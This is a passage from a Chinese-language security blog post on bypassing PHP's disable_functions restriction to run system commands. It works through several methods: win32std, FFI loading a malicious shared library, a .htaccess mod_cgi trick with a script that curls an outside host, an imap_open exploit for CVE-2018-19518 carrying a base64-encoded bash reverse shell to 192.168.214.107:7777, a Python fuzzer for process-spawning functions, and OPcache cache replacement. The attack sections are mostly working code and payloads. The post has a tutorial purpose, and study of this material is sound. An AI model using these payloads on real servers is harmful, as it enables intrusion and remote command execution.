wxecuted</span></span><br><span class="line"><span class="comment">//if you browse it through apache, you'll see a new cmd.exe process activated in taskmanager</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!extension_loaded(<span class="string">"win32std"</span>)) <span class="keyword">die</span>(<span class="string">"win32std extension required!"</span>);</span><br><span class="line">system(<span class="string">"cmd.exe"</span>); <span class="comment">//just to be sure that protections work well</span></span><br><span class="line">win_shell_execute(<span class="string">"..\\..\\..\\..\\windows\\system32\\cmd.exe"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="8-FFI-绕过-disable-functions"><a href="#8-FFI-绕过-disable-functions" class="headerlink" title="8. FFI 绕过 disable_functions"></a>8. FFI 绕过 disable_functions</h3><p>PHP7.4 的一个新特性 FFI（Foreign Function Interface），即外部函数接口，可以让我们在 PHP 中调用 C 代码</p>
<p>建议在 Docker 中进行测试</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libffi-dev</span><br><span class="line"></span><br><span class="line">docker-php-ext-install ffi</span><br></pre></td></tr></table></figure>
<p>通常使用 FFI::cdef 创建一个新的 FFI 对象，下面是官方说明</p>
<p><code>public static FFI::cdef ([ string $code = &quot;&quot; [, string $lib ]] ) : FFI</code></p>
<blockquote>
<p>Parameters</p>
<p>code</p>
<p>A string containing a sequence of declarations in regular C language (types, structures, functions, variables, etc). Actually, this string may be &gt; copy-pasted from C header files.</p>
<p>Note:</p>
<p>C preprocessor directives are not supported, i.e. #include, #define and CPP macros do not work.</p>
<p>lib</p>
<p>The name of a shared library file, to be loaded and linked with the definitions.</p>
<p>Note:</p>
<p>If lib is omitted, platforms supporting RTLD_DEFAULT attempt to lookup symbols declared in code in the normal global scope. Other systems will fail to &gt; resolve these symbols.</p>
</blockquote>
<p>那如何执行系统命令呢，使用 FFI::cdef 声明一个 system 函数使用就可以了， <code>man system</code> 查看 system 函数说明，直接复制就好</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int system(const char *command);"</span>,</span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"></span><br><span class="line">$ffi-&gt;system(<span class="string">"id"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>成功执行</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis11.png" alt></p>
<p>​    这里如果只定义 system 函数而省略 libc.so.6 同样也是可以执行命令的，支持 RTLD_DEFAULT 的平台将尝试在常规全局范围内查找在代码中声明的符号</p>
<p>​    当我们只能控制 FFI::cdef 函数的 lib 参数的时候，FFI::cdef 函数还可以加载我们自定义的动态链接库，但是需要填写绝对路径，否则会无法加载，比如</p>
<p>ffi.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">        <span class="string">"int system(const char *command);"</span>,</span><br><span class="line">        <span class="string">"/var/www/html/bad.so"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>bad.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">j0k3r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">"echo Hacked &amp;&amp; id"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只要加载编译好的 bad.so 即可执行恶意代码</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis12.png" alt></p>
<h3 id="9-Apache-mod-cgi-修改-htaccess-绕过限制"><a href="#9-Apache-mod-cgi-修改-htaccess-绕过限制" class="headerlink" title="9. Apache mod_cgi 修改 .htaccess 绕过限制"></a>9. Apache mod_cgi 修改 .htaccess 绕过限制</h3><p>有几个利用条件</p>
<ol>
<li>Apache 开启 AllowOverride</li>
<li>开启 cgi_module</li>
<li>.htaccess 文件可写</li>
<li>cgi 程序可执行</li>
</ol>
<p>本地测试环境推荐使用 Docker，会比较最方便</p>
<p><code>docker pull bronsonbdevost/cgi-web-server</code></p>
<p>默认 cgi 目录在 /usr/local/apache2/cgi-bin，配置文件位于 /usr/local/apache2/conf/httpd.conf</p>
<p>默认没有 PHP，安装</p>
<p><code>apt-get install php5-common libapache2-mod-php5</code></p>
<p>安装 libsqlite3-0 404 的话可以到网站下载</p>
<p><a href="https://packages.debian.org/zh-cn/jessie/amd64/libsqlite3-0/download" target="_blank" rel="noopener">https://packages.debian.org/zh-cn/jessie/amd64/libsqlite3-0/download</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://security.debian.org/debian-security/pool/updates/main/s/sqlite3/libsqlite3-0_3.8.7.1-1+deb8u4_amd64.deb</span><br><span class="line"></span><br><span class="line">dpkg -i libsqlite3-0_3.8.7.1-1+deb8u4_amd64.deb</span><br></pre></td></tr></table></figure>
<p>添加 php5 模块配置文件</p>
<p><code>cp /etc/apache2/mods-available/php5.conf.dpkg-new conf/extra/php5_module.conf</code></p>
<p>修改 httpd.conf </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php5-script php</span><br><span class="line">LoadModule php5_module /usr/lib/apache2/modules/libphp5.so</span><br><span class="line"></span><br><span class="line">Include conf/extra/php5_module.conf</span><br></pre></td></tr></table></figure>
<p>重启 Apache</p>
<p><code>/usr/local/apache2/bin/apachectl restart</code></p>
<p>模拟写入恶意 .htaccess 文件，添加后缀 .sh </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .sh</span><br></pre></td></tr></table></figure>
<p>上传 sh 文件，浏览器访问即可执行其中的命令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Content-type: text/html"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Hello, Shell"</span></span><br><span class="line">curl 192.168.214.107:7777</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis13.png" alt></p>
<h3 id="10-利用-PHP-bug-Bypass-disable-functions"><a href="#10-利用-PHP-bug-Bypass-disable-functions" class="headerlink" title="10. 利用 PHP bug Bypass disable_functions"></a>10. 利用 PHP bug Bypass disable_functions</h3><p>利用两个 PHP 历史漏洞来绕过 disable_functions</p>
<p>Exploits ：</p>
<p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a></p>
<h4 id="1-Use-after-free-with-json-serializer"><a href="#1-Use-after-free-with-json-serializer" class="headerlink" title="(1) Use after free with json serializer"></a>(1) Use after free with json serializer</h4><p><a href="https://bugs.php.net/bug.php?id=77843" target="_blank" rel="noopener"></a></p>
<ul>
<li>适用目标：<ul>
<li>7.1 - all versions to date</li>
<li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li>
<li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li>
</ul>
</li>
</ul>
<p>php-json-bypass</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis14.png" alt></p>
<h4 id="2-Use-After-Free-in-GC-with-Certain-Destructors"><a href="#2-Use-After-Free-in-GC-with-Certain-Destructors" class="headerlink" title="(2) Use After Free in GC with Certain Destructors"></a>(2) Use After Free in GC with Certain Destructors</h4><p><a href="https://bugs.php.net/bug.php?id=72530" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72530</a></p>
<ul>
<li>适用目标：<ul>
<li>7.0 - all versions to date</li>
<li>7.1 - all versions to date</li>
<li>7.2 - all versions to date</li>
<li>7.3 - all versions to date</li>
</ul>
</li>
</ul>
<p>php7-gc-bypass</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis15.png" alt></p>
<p>测试在 ubuntu16.04 + PHP 7.1.33 的环境下两个 exp 都是可以正常使用的，但如果是在 Docker 或者是其他环境下那就不一定了</p>
<h3 id="11-PHP-imap-open-RCE-漏洞-（CVE-2018-19518）"><a href="#11-PHP-imap-open-RCE-漏洞-（CVE-2018-19518）" class="headerlink" title="11. PHP imap_open RCE 漏洞 （CVE-2018-19518）"></a>11. PHP imap_open RCE 漏洞 （CVE-2018-19518）</h3><p>要求 PHP 安装 imap 模块</p>
<p>反弹 shell payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.214.107/7777 0&gt;&amp;1"</span>;</span><br><span class="line">$base64 = base64_encode($payload);</span><br><span class="line">$server = <span class="string">"any -oProxyCommand=echo\t&#123;$base64&#125;|base64\t-d|bash"</span>;</span><br><span class="line">@imap_open(<span class="string">"&#123;"</span>.$server.<span class="string">"&#125;:143/imap&#125;INBOX"</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis17.png" alt></p>
<h3 id="一些利用工具"><a href="#一些利用工具" class="headerlink" title="一些利用工具"></a>一些利用工具</h3><p>1.Bypass disable_functions 工具:</p>
<p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p>
<p>2.AntSword 绕过 PHP disable_functions 插件:</p>
<p><a href="https://github.com/Medicean/as_bypass_php_disable_functions" target="_blank" rel="noopener">antsword bypass PHP disable_functions</a></p>
<p><a href="https://0xdf.gitlab.io/2019/08/02/bypassing-php-disable_functions-with-chankro.html" target="_blank" rel="noopener">3.Chankro:</a></p>
<p><a href="https://github.com/TarlogicSecurity/Chankro" target="_blank" rel="noopener">https://github.com/TarlogicSecurity/Chankro</a></p>
<h2 id="0x02-Fuzz-挖掘含内部系统调用的函数"><a href="#0x02-Fuzz-挖掘含内部系统调用的函数" class="headerlink" title="0x02 Fuzz 挖掘含内部系统调用的函数"></a>0x02 Fuzz 挖掘含内部系统调用的函数</h2><p>​    主要是指使用 LD_PRELOAD 这种方式绕过 disable_functions 的时候，需要满足一个条件，就是使用的 php 函数需要在内部调用 execve 等系统功能开启一个新进程</p>
<p>​    那怎么知道到底哪些函数可以满足这种绕过方法呢，之前看到有一篇国外的文章 <a href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/" target="_blank" rel="noopener">Fuzzer gets us new functions to bypass PHP disable_functions</a> ，文中讲了如何使用 Fuzz 获得这一类 php 函数</p>
<p>​    大体思路就是尽可能多的安装 php 的各种模块，增加 php 内部定义的函数数量，然后确定每个函数所需要的参数个数范围，接着输入参数，运行函数，strace 查看是否有 execve 系统调用的行为发生</p>
<p>​    在获取函数的参数信息方面，使用的是 php 的函数反射类——ReflectionFunction，getNumberOfRequiredParameters() getNumberOfParameters() 方法分别获取函数的最小和最大参数个数，原文中直接使用报错信息判断参数个数未免不够优雅</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/image-20200131192719453.png" alt="image-20200131192719453"></p>
<p>​    参数数目确定了，接着就是数据类型，但是每个参数的类型都不一定相同</p>
<p>​    其实 ReflectionParameter 类的 getClass() 方法能获得类型提示类，getType() 直接获取参数类型，但是这个用在用户自定义函数的参数上还行，对于内部函数来说返回值都是 NULL，基本用不了。举个例子</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/image-20200131195140178.png" alt="image-20200131195140178"></p>
<p>​    如图，用户自定义函数 foo 能够通过反射直接获得一个 <strong>ReflectionNamedType</strong>类，getName() 得到参数类型，比较迷的是 php 官方文档上写的是 ReflectionType，具体见： <a href="https://www.php.net/manual/zh/class.reflectionparameter.php" target="_blank" rel="noopener">PHP: ReflectionParameter - Manual</a>这一页，而搜索 ReflectionNamedType 得到的却是 <a href="https://www.php.net/manual/zh/class.reflectionnamedtype" target="_blank" rel="noopener">404</a>，看来 php 在反射这方面的文档还没有完善</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/image-20200131195807351.png" alt="image-20200131195807351"></p>
<p>但是 php 作为一个弱类型语言这时候就凸显了它的优势，很多 php 函数本身就是  mixed 类型，而且 php 还会自动进行类型转换</p>
<p>像 ‘1../../../../../../../../../etc/passwd’ 这种参数就能同时满足 string、int、file、bool 四种类型，基本满足绝大部分函数了</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/image-20200131032400498.png" alt="image-20200131032400498"></p>
<p>​    感觉原文那代码处理的不太好，还有 bug，自己写了一个，加了个可以 fuzz 指定 php 模块的功能，比如安装了 gnupg 拓展，可以 Fuzz 该模块下的所有函数，方便测试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAllDefinedFunc</span><span class="params">()</span>:</span></span><br><span class="line">    get_defined_function = os.popen(<span class="string">"php -r 'print_r(get_defined_functions()[\"internal\"]);'"</span>).readlines()</span><br><span class="line">    <span class="comment">#print get_defined_function</span></span><br><span class="line">    b = get_defined_function[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    b = map(str.strip, b)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b)):</span><br><span class="line">        b[i] = re.sub(<span class="string">r'.*&gt; '</span>, <span class="string">''</span>, b[i])</span><br><span class="line">    get_defined_function = b	<span class="comment"># all defined PHP functions</span></span><br><span class="line">    get_defined_function.remove(get_defined_function[<span class="number">0</span>])</span><br><span class="line">    get_defined_function.remove(get_defined_function[<span class="number">0</span>])</span><br><span class="line">    get_defined_function.remove(<span class="string">'readline'</span>)</span><br><span class="line">    <span class="keyword">return</span> get_defined_function</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getModuleFunc</span><span class="params">(phpModuleName,getDefinedFunction)</span>:</span></span><br><span class="line">    moduleFunc = []</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> getDefinedFunction:</span><br><span class="line">        getExtNameCmd = <span class="string">"php -r \"echo (new ReflectionFunction('&#123;&#125;'))-&gt;getExtensionName();\""</span>.format(func)</span><br><span class="line">        extName = os.popen(getExtNameCmd).readlines()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> extName == phpModuleName:</span><br><span class="line">            moduleFunc.append(func)</span><br><span class="line">    <span class="keyword">return</span> moduleFunc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzzFunc</span><span class="params">(getDefinedFunction)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> getDefinedFunction:</span><br><span class="line">        maxParaNumCmd = <span class="string">"php -r \"echo (new ReflectionFunction('&#123;&#125;'))-&gt;getNumberOfParameters();\""</span>.format(func)</span><br><span class="line">        minParaNumCmd = <span class="string">"php -r \"echo (new ReflectionFunction('&#123;&#125;'))-&gt;getNumberOfRequiredParameters();\""</span>.format(func)</span><br><span class="line">        maxParaNum = int(os.popen(maxParaNumCmd).readlines()[<span class="number">0</span>])</span><br><span class="line">        minParaNum = int(os.popen(minParaNumCmd).readlines()[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">print</span> maxParaNum</span><br><span class="line">        <span class="keyword">print</span> minParaNum</span><br><span class="line">        <span class="keyword">for</span> paraNum <span class="keyword">in</span> range(minParaNum,maxParaNum + <span class="number">1</span>):</span><br><span class="line">            paraMeters = [<span class="string">'\'1../../../../../../../../../etc/passwd\''</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(paraNum)]</span><br><span class="line">            paraMeters = <span class="string">','</span>.join(paraMeters)</span><br><span class="line">            newPhpCmd = <span class="string">"php -r \"&#123;&#125;(&#123;&#125;);\""</span>.format(func,paraMeters)</span><br><span class="line">            <span class="keyword">print</span> newPhpCmd</span><br><span class="line">            newFuzzCmd = <span class="string">"strace -f &#123;&#125; 2&gt;&amp;1 | grep -E 'execve|fork|vfork'"</span>.format(newPhpCmd)</span><br><span class="line">            <span class="keyword">print</span> newFuzzCmd</span><br><span class="line">            out = re.findall(<span class="string">r'execve'</span>, <span class="string">''</span>.join(os.popen(newFuzzCmd).readlines()[<span class="number">1</span>:]))</span><br><span class="line">            <span class="keyword">print</span> out</span><br><span class="line">            <span class="keyword">if</span> len(out) &gt;= <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">'fuzz-out.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> file:</span><br><span class="line">                    file.write(newPhpCmd + <span class="string">"\n"</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        phpModuleName = sys.argv[<span class="number">1</span>]</span><br><span class="line">        getDefinedFunction = getAllDefinedFunc()</span><br><span class="line">        moduleFunc = getModuleFunc(phpModuleName,getDefinedFunction)</span><br><span class="line">        <span class="keyword">if</span> len(moduleFunc) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">'没有找到与指定模块相关的函数，检查名称是否正确'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#print moduleFunc</span></span><br><span class="line">            fuzzFunc(moduleFunc)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'fuzz all'</span>)</span><br><span class="line">        getDefinedFunction = getAllDefinedFunc()</span><br><span class="line">        fuzzFunc(getDefinedFunction)</span><br></pre></td></tr></table></figure>
<p>Fuzz 测试结果：</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/fuzz-1.png" alt="fuzz-1"></p>
<p>单一模块 Fuzz 结果：</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/image-20200131201820976.png" alt="image-20200131201820976"></p>
<p>这种方式可以用于发现新的可用于 bypass 的函数，或者用来检测安全过滤够不够严格</p>
<h3 id="利用-OPcache-执行命令"><a href="#利用-OPcache-执行命令" class="headerlink" title="利用 OPcache 执行命令"></a>利用 OPcache 执行命令</h3><p><strong>注</strong>：<strong>OPcache 不能饶过 disable_functions</strong>，它调用内部函数或方法时仍然会被限制</p>
<p>OPcache 通过将 PHP 脚本预编译的字节码（Operate Code）存储到共享内存中来提升 PHP 的性能</p>
<p>如果我们知道 OPcache 的缓存路径，就可以通过替换缓存文件来直接执行系统命令</p>
<p>首先是要求 PHP 开启了 OPcache，下面是 php.ini 中的 OPcache 常规配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[opcache]</span><br><span class="line">zend_extension=/usr/lib/php/20151012/opcache.so</span><br><span class="line">opcache.enable=1</span><br><span class="line">opcache.enable_cli=1</span><br><span class="line">opcache.memory_consumption=528</span><br><span class="line">opcache.interned_strings_buffer=8</span><br><span class="line">opcache.max_accelerated_files=10000</span><br><span class="line">opcache.revalidate_freq=1</span><br><span class="line">opcache.fast_shutdown=1</span><br><span class="line">opcache.validate_timestamps=0</span><br><span class="line">opcache.file_cache=/tmp</span><br></pre></td></tr></table></figure>
<p>其中的 opcache.file_cache 则是指定缓存目录，比如设置 /tmp，运行 /var/www/html/ 下的 index.php 则会生成相应的 /tmp/[system_id]/var/www/html/index.php.bin 文件</p>
<p>system_id 是当前 PHP 版本号，Zend 扩展版本号以及各个数据类型大小的 MD5 值</p>
<p>在另一个环境下利用 opcache 得到一个包含恶意代码的缓存文件，更改其文件头后面的 system_id 为要替换的缓存文件的 system_id，只需更改 system_id，文件 16 进制中的 php 文件目录即使不同也无需更改</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis19.png" alt></p>
<p>替换相应缓存目录下的缓存文件，再次运行查看运行结果</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis18.png" alt></p>
<h2 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h2><p><a href="https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/" target="_blank" rel="noopener">https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/</a></p>
<p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p>
<p><a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/10612798.html</a></p>
<p><a href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/" target="_blank" rel="noopener">https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://j0k3r.top/2020/02/13/disable_functions-bypass/">http://j0k3r.top/2020/02/13/disable_functions-bypass/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://j0k3r.top">J0k3r's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP/">PHP</a><a class="post-meta__tags" href="/tags/disable-functions/">disable_functions</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/alipay.jpg"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/wechat.jpg"><div class="post-qr-code__desc">微信打赏</div></div></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/03/01/ctfd-CVE-2020-7245/"><i class="fa fa-chevron-left">  </i><span>CVE-2020-7245 CTFd 任意账户接管漏洞 分析</span></a></div><div class="next-post pull-right"><a href="/2020/01/08/ssh-proxy/"><span>使用 SSH 建立 socks 代理进行内网穿透</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'true' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'yeOeLCiDRMa7CAnJy2jxA2IY-gzGzoHsz',
  appKey:'eAgtubAYTMshS76hpc1F1UBG',
  placeholder:'Just go go',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/wallhaven-j5k275.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"superSample":2,"width":210,"height":420,"position":"left","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>